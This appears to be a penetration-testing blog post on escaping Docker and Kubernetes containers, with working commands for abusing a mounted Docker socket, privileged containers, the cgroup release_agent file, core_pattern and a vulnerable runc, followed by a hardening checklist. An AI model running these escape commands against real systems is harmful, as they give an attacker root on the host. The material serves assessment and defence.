---
title: "Container Escapes: From Docker Socket Exposure to Host Compromise"
date: 2022-11-25
draft: false
tags: ["Docker", "Kubernetes", "Container Escape", "Linux"]
categories: ["Pentesting"]
summary: "The misconfigurations and kernel issues that turn 'we run containers' into 'the container is a perimeter you don't have'."
---

Containers are not a security boundary in the sense people expect. They are a process isolation feature implemented with namespaces and cgroups, sharing one kernel with the host. When the configuration is wrong, escape is often a two-command exercise.

Here are the routes I check first on any container-based assessment.

## 1. The Docker socket

If the socket is mounted into a container, the container controls the host's Docker daemon. There is no exploit here — it's a feature being used as intended, by the wrong person.

```bash
ls -l /var/run/docker.sock
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh
```

That's a root shell on the host. Mounting the socket into a web app or CI runner is unfortunately still common.

## 2. Privileged containers

`--privileged` disables the device cgroup restrictions and gives you access to host devices:

```bash
ls /dev | head
mkdir -p /mnt/hostdisk && mount /dev/sda1 /mnt/hostdisk
chroot /mnt/hostdisk sh
```

Even without a disk device, a privileged container can be escaped by loading a kernel module or by using `nsenter` into PID 1:

```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

## 3. cgroup `release_agent`

In cgroup v1, an unprivileged container that can write to its own cgroup hierarchy can abuse the `release_agent` file, which the kernel executes *on the host*:

```bash
# Find the cgroup mount in /proc/self/mountinfo, then:
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
printf '#!/bin/sh\nid > /cmd_out\n' > /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

This was behind CVE-2022-0492, where the `release_agent` path could be written even inside a namespace without `CAP_SYS_ADMIN`. It's worth knowing the primitive regardless of patch state, because the same structure appears whenever a container shares the host cgroup namespace.

## 4. `core_pattern`

`/proc/sys/kernel/core_pattern` is host-global. If a container can write to it, a crash inside the container runs a host-side program:

```bash
cat /proc/sys/kernel/core_pattern
# If writable:
echo "|/proc/%P/fd/666 %p" > /proc/sys/kernel/core_pattern
```

The same class of problem: a host-global kernel interface exposed into a namespace.

## 5. Vulnerable runtime

`runc` CVE-2019-5736 allowed overwriting the host `runc` binary from inside a container, triggered on the next `exec`. If you find an old container runtime on the host, that's the path — check with `runc --version`.

## Hardening checklist

What actually reduces this surface:

- **Never mount the Docker socket into anything.** Use a socket proxy with an explicit API allowlist if a tool genuinely needs it.
- **Drop `--privileged`.** Enumerate the capabilities you actually need and add those.
- **Run with a read-only root filesystem and no `CAP_SYS_ADMIN`.**
- **Use user namespaces** so container root maps to an unprivileged host UID.
- **Apply seccomp and AppArmor profiles** — the default Docker profile blocks a meaningful subset of these.
- **Patch the runtime and the host kernel.** Several of the techniques above are kernel-interface problems, not container-runtime bugs.

The pattern across all of them is the same: a host-global resource — a socket, a device, a cgroup file, a sysctl — is reachable from inside the namespace. Find those, and you find the escapes.
